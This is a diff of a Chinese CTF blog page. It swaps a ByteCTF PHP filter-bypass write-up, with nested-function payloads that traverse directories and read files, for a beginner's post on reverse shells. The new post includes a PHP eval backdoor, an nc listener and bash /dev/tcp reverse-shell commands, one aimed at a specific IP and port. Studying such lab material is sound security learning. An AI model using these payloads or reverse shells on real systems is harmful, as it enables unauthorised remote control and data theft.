@@ -4,12 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="decade wp, Z3ratu1&#39;s blog">
-    <meta name="description" content="decade wp复现复现，是一道bytectf修改了的题，加了几个过滤
-无参数函数的命令执行&amp;lt;?php
-highlight_file(__FILE__);
-$code = $_GET[&#39;code&#39;];
-if (!empty($cod">
+    <meta name="keywords" content="反弹shell入门, Z3ratu1&#39;s blog">
+    <meta name="description" content="反弹shell入门起源于今天AA师傅的一个简单web，但是由于对反弹shell的一无所知和对某些知识的偏差认识浪费了一个下午没做出来反弹shell需要对标准输入输出流重定向有一点基础的理解，大致原理不在赘述，只是做个记录
+上很简单的源码
+&amp;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +15,7 @@ if (!empty($cod">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>decade wp | Z3ratu1&#39;s blog</title>
+    <title>反弹shell入门 | Z3ratu1&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -289,13 +287,13 @@ if (!empty($cod">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/note.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        decade wp
+                        反弹shell入门
                     </div>
                 </div>
             </div>
@@ -406,8 +404,8 @@ if (!empty($cod">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/php/" target="_blank">
-                                <span class="chip bg-color">php</span>
+                            <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" target="_blank">
+                                <span class="chip bg-color">反弹shell</span>
                             </a>
                         
                     </div>
@@ -418,8 +416,8 @@ if (!empty($cod">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
-                                刷题记录
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
+                                笔记
                             </a>
                         
                     </div>
@@ -430,21 +428,21 @@ if (!empty($cod">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-11-10
+                    2020-02-14
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.2k
+                        498
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        4 Min
+                        1 Min
                     </div>
                     
                 
@@ -460,36 +458,16 @@ if (!empty($cod">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="decade-wp"><a href="#decade-wp" class="headerlink" title="decade wp"></a>decade wp</h1><p>复现复现，是一道bytectf修改了的题，加了几个过滤</p>
-<h2 id="无参数函数的命令执行"><a href="#无参数函数的命令执行" class="headerlink" title="无参数函数的命令执行"></a>无参数函数的命令执行</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-                    <span class="token keyword">echo</span> <span class="token string">'bye~'</span><span class="token punctuation">;</span>
-                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-                    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token punctuation">}</span>
-            <span class="token punctuation">}</span>
-        <span class="token keyword">else</span> <span class="token punctuation">{</span>
-            <span class="token keyword">echo</span> <span class="token string">"No way!!!"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token string">"No way!!!"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span></code></pre>
-<p>贴一下源码</p>
-<p>这个正则大概意思就是只允许无参数的函数调用，并且函数还得是全英文的，不能有下划线数字之类的，(?R)表示引用当前正则表达式，?匹配一次或零次，也就是可以<code>func1(func2(func3(())))</code>这样子，后来看了师傅们的payload发现还可以<code>func1(func2())func3()</code>这个样子</p>
-<h2 id="无中生有的用函数返回值获取字符串"><a href="#无中生有的用函数返回值获取字符串" class="headerlink" title="无中生有的用函数返回值获取字符串"></a>无中生有的用函数返回值获取字符串</h2><p>各种各样的神仙技巧，要求对各个函数的功能足够熟练才能做出来了，fuzz跑出内置函数然后做数学题或者各种各样的变换，我只能列一下学到的知识了</p>
-<h3 id="获取’-’"><a href="#获取’-’" class="headerlink" title="获取’.’"></a>获取’.’</h3><h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>第一步，用chr(47)获取<code>.</code>，第二步，想办法无中生有一个数字出来，大佬的fuzz跑出来了一个phpversion函数，返回一个当前版本号，7.xxx，然后开始做数学题（我不太清楚这个数学题怎么做的）<br><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>=47<br>这样子我们就可以访问当前目录了</p>
-<h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>fuzz测试出localeconv()函数返回数组的第一位是<code>.</code>，就能直接current(localeconv())拿到</p>
-<h4 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h4><p>用crypt函数对字符串进行加密，有概率在最后一位出现一个<code>.</code>，然后strrev翻转字符串，chr(ord())取得第一位，概率获得一个<code>.</code><br><code>chr(ord(strrev(crypt(($arg)))))</code>这里的arg好像是啥都行，数字，bool值都可以<br>所以用phpversion()也好，接着chdir()也好，都能用，就是概率性问题<br>还有见到用<code>serialize(array())</code>来获取字符串的</p>
-<h3 id="获取’-’穿越目录"><a href="#获取’-’穿越目录" class="headerlink" title="获取’..’穿越目录"></a>获取’..’穿越目录</h3><p>flag在上级目录，所以我们还得拿一个<code>..</code>进行目录穿越，在执行ls -a的时候，列出来的目录的第二位是一个<code>..</code>，所以我们next(scandir())就能获得<code>..</code></p>
-<h3 id="跳完目录还得再获取一个’-’"><a href="#跳完目录还得再获取一个’-’" class="headerlink" title="跳完目录还得再获取一个’.’"></a>跳完目录还得再获取一个’.’</h3><p>需要chdir穿越目录之后再来一个<code>.</code>，chdir的返回值是一个布尔值true，大佬说用localtime(time(true))可以构造一个47出来，因为时间不同会随之变化，但是实际上我试的时候怎么试都是0，该方案只得作罢<br>否则如果成功穿越目录并scandir的话，可以继续使用next(),current(),end()等函数读取处于特定位置的文件<br>样例payload:<code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</code><br>又：本地测试时显示pos函数的返回值为空，查一下发现可以用current函数代替，不知道大佬是怎么做出来的</p>
-<h3 id="跳目录与读文件分开的奇妙操作"><a href="#跳目录与读文件分开的奇妙操作" class="headerlink" title="跳目录与读文件分开的奇妙操作"></a>跳目录与读文件分开的奇妙操作</h3><p>可以用if()func()这样的语法执行跳目录，在if里面跳目录，然后chdir返回一个true，if语句就通过了，再在后面执行读文件，不得不说是非常高级的思路了（然而我读的时候没意识到正则还能这么匹配过去）<br>所以我们<code>if(chdir(..))readfile(scandir(.))</code>，根据scandir的情况选择用哪个函数读取处于哪个位置的文件</p>
-<h2 id="本题payload"><a href="#本题payload" class="headerlink" title="本题payload"></a>本题payload</h2><p>以上部分均为bytectf的boring_code，这之前还有一层跳转的绕过，本题去掉了之前的一层又多加了几个过滤，把我们做数学题时用到的sqrt，获取第二个<code>.</code>的time，local，还有读文件的readfile和分开跳目录读文件的if给禁止了，可以用一些相关函数代替<br>if只是为了分开执行一下语句，我们用一个while也可以达到同样的效果，数学方法没得了就可以用之前提到的加密方法去做，不过存在了一定的随机性<br>readfile被禁止了可以用file函数代替，不同的是file函数会把文件分行读进一个数组里，print_r，var_dump带下划线不能用了，echo会输出Array，又是current，next，end几个函数读特定行<br>payload:<code>while(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))echo(next(file(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))))));</code></p>
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实看看禁用的列表也能得到部分出题人对这种绕过的思路<br>strlen就是一个获得数字的方法，info估计就能获得各种各样的字符了，rand生成随机数，bin，hex二进制十六进制应该也能整出数字来</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/</a></p>
+                <h1 id="反弹shell入门"><a href="#反弹shell入门" class="headerlink" title="反弹shell入门"></a>反弹shell入门</h1><p>起源于今天AA师傅的一个简单web，但是由于对反弹shell的一无所知和对某些知识的偏差认识浪费了一个下午没做出来<br>反弹shell需要对标准输入输出流重定向有一点基础的理解，大致原理不在赘述，只是做个记录</p>
+<p>上很简单的源码</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h2 id="PHP的命令执行"><a href="#PHP的命令执行" class="headerlink" title="PHP的命令执行"></a>PHP的命令执行</h2><p>反引号``等价于一个函数shell_exec()，传入一个参数cmd并在命令行中执行它，但是执行输出由返回值给出（所以我echo了一个下午在想为什么没有回显），<strong>使用sleep即可尝试是否进行了命令执行</strong><br>这里构造<code>$a</code>;作为$a的前五个字符，eval函数即为执行`$a`；即在命令行下输入$a的内容。所以$a的内容前五个字符确定，后门即可任意代码执行。由于执行结果在函数返回值中无法获取，则需要通过外带的方法获取结果</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>一个方法就是通过受害机反向链接攻击机取得一个shell，即为反弹shell<br>通过<code>nc -lvp port</code> 监听攻击机的端口<br>在受害机上执行<code>bash -i &gt;&amp; /dev/tcp/公网ip/port 0&gt;&amp;1</code>，链接攻击机，这个语句将受害机的标准输入输出全部重定向到攻击机上，实现在攻击机端获取受害机shell，这里实操的时候这一句还不够，需要<code>bash -c bash -i &gt;&amp; /dev/tcp/47.103.140.44/10005 0&gt;&amp;1&quot;</code>才成功连接到我的服务器上，弹shell的语句还可以构造出很多种，这只是一个无过滤的简单后门，暂时对弹shell这个操作进行入门罢了</p>
+<h2 id="curl外带"><a href="#curl外带" class="headerlink" title="curl外带"></a>curl外带</h2><p>也可以通过curl对自己的服务器发包将数据外带，不过我还不会（菜）</p>
 
             </div>
             <hr/>
@@ -648,9 +626,9 @@ if (!empty($cod">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《decade wp》
+                    《反弹shell入门》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/10/decade%20wp/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/14/%E5%8F%8D%E5%BC%B9shell/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -690,47 +668,49 @@ if (!empty($cod">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2019/12/10/%E4%B8%89%E5%8F%B6%E8%8D%89%E6%8B%9B%E6%96%B0%E8%B5%9B/">
+                <a href="/2020/02/14/%E5%8F%8D%E5%BC%B9shell/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf1.jpg" class="responsive-img" alt="三叶草招新赛部分wp">
+                        <img src="/img/note.jpg" class="responsive-img" alt="反弹shell入门">
                         
-                        <span class="card-title">三叶草招新赛部分wp</span>
+                        <span class="card-title">反弹shell入门</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            三叶草招新赛部分wp最近是三叶草招新，不愧是强队，招新赛都这么难，学习了QWQ
-性感黄阿姨在线聊天打开是一个对话框，输入表情包可以获得三叶草师傅们的表情包（没有什么实际意义）题目分两层，一层PHP弱类型一层XXE（xml实体注入）
-弱类型比
+                            反弹shell入门起源于今天AA师傅的一个简单web，但是由于对反弹shell的一无所知和对某些知识的偏差认识浪费了一个下午没做出来反弹shell需要对标准输入输出流重定向有一点基础的理解，大致原理不在赘述，只是做个记录
+上很简单的源码
+&
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
-                                    刷题记录
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
+                                    笔记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/xxe/" target="_blank">
-                        <span class="chip bg-color">xxe</span>
+                    <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" target="_blank">
+                        <span class="chip bg-color">反弹shell</span>
                     </a>
                     
                 </div>
@@ -744,26 +724,28 @@ if (!empty($cod">
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/03/babyt5/">
+                <a href="/2020/02/12/SUCTF2019%20ezphp/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf.jpg" class="responsive-img" alt="babyt5">
+                        <img src="/img/ctf1.jpg" class="responsive-img" alt="SUCTF2019 ezweb">
                         
-                        <span class="card-title">babyt5</span>
+                        <span class="card-title">SUCTF2019 ezweb</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            babyt5 wp今天在做什么第五届上海大学生网络安全大赛的一道题，好像是安恒月赛的一道题，感觉题目问题也挺大，有机会自己搭环境搞一搞，对着wp复现了一遍
-二次编码绕过&lt;?php
-highlight_file(__FILE__);
-$
+                            SUCTF2019 ezwebBUU平台上复现题目，主要学习了一下异或绕过的操作还踩了一些奇奇怪怪的坑，题目共三层，层层绕过搞了我好几天，还是太菜了
+第一层第一层源码
+$hhh = @$_GET['_'];
+
+if (!$hhh){
+   
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-03
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-12
                             </span>
                         <span class="publish-author">
                             
@@ -784,16 +766,8 @@ $
                         <span class="chip bg-color">php</span>
                     </a>
                     
-                    <a href="/tags/SSRF/" target="_blank">
-                        <span class="chip bg-color">SSRF</span>
-                    </a>
-                    
-                    <a href="/tags/gopher/" target="_blank">
-                        <span class="chip bg-color">gopher</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">
-                        <span class="chip bg-color">文件包含</span>
+                    <a href="/tags/wp/" target="_blank">
+                        <span class="chip bg-color">wp</span>
                     </a>
                     
                 </div>
